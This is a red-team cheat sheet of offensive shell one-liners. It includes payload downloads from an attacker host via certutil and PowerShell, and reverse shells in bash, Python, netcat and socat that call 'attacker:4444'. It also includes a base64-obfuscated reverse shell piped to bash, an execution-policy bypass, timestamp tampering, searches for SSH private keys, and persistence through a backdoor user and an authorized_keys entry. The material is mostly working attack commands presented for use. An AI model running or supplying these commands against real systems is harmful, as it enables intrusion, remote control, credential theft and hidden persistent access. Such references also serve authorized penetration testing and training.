# Red Team Tidbits Cheat Sheet

## 📥 File Transfer

```bash
# Windows: Download with certutil
certutil -urlcache -split -f http://attacker/payload.exe payload.exe
```

```bash
# PowerShell download
powershell -command "(New-Object Net.WebClient).DownloadFile('http://attacker/payload.exe','payload.exe')"
```

```bash
# Python HTTP server (Python 3.x)
python3 -m http.server 8080
```

```bash
# Python upload server
sudo python3 -m http.server --bind 0.0.0.0 8080 --directory /upload/dir
```

```bash
# Transfer with SCP
scp file.txt user@target:/tmp/file.txt
```

---

## 🧠 Shell Upgrades

```bash
# Bash TTY upgrade
python3 -c 'import pty; pty.spawn("/bin/bash")'
Ctrl-Z
stty raw -echo; fg
export TERM=xterm; reset
```

```bash
# Zsh TTY upgrade
python3 -c 'import pty; pty.spawn("/bin/zsh")'
Ctrl-Z
stty raw -echo; fg
export TERM=xterm; reset
```

```bash
# Socat reverse shell (on target)
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:attacker:4444
```

---

## ⤴️ Privilege Escalation Tips

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

```bash
# Check for writable cron jobs
ls -la /etc/cron* /var/spool/cron/
```

```bash
# Check for world-writable files
find / -type f -perm -2 -ls 2>/dev/null
```

```bash
# GTFOBins quick privilege escalation
find / -type f -executable -exec basename {} ; | sort -u | grep -f <(curl -s https://gtfobins.github.io/gtfobins.json | jq -r '.[] | .name')
```

---

## 🔄 Reverse Shell One-Liners

```bash
# Bash reverse shell
bash -i >& /dev/tcp/attacker_ip/4444 0>&1
```

```bash
# Python3 reverse shell
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("attacker",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'
```

```bash
# Netcat with -e (if supported)
nc -e /bin/bash attacker 4444
```

```bash
# Netcat without -e (fallback)
mkfifo /tmp/f; /bin/sh < /tmp/f | nc attacker 4444 > /tmp/f
```

---

## 🔍 Recon & Enumeration

```bash
# Find .ssh keys
find / -name "id_rsa" 2>/dev/null
```

```bash
# List users with shells
cat /etc/passwd | grep '/bin/bash'
```

```bash
# Find writable files
find / -writable -type f 2>/dev/null
```

```bash
# Check for Docker group access (container breakout)
groups
```

---

## 🕵️‍♂️ Evasion & Obfuscation

```bash
# Base64 encode payload
echo 'bash -i >& /dev/tcp/attacker/4444 0>&1' | base64
```

```bash
# Decode base64 on victim
echo 'YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjAuMS80NDQ0IDA+JjE=' | base64 -d | bash
```

```bash
# PowerShell bypass execution policy
powershell -ep bypass -c "Invoke-WebRequest ..."
```

```bash
# Touch file to change timestamp
touch -t 202201010000 file.txt
```

---

## 🔒 Persistence Nuggets

```bash
# Add backdoor user (if root)
useradd -m -s /bin/bash r3dt34m && echo 'r3dt34m:password' | chpasswd
```

```bash
# Add public key to authorized_keys
echo "ssh-rsa AAAA..." >> ~/.ssh/authorized_keys
```

---

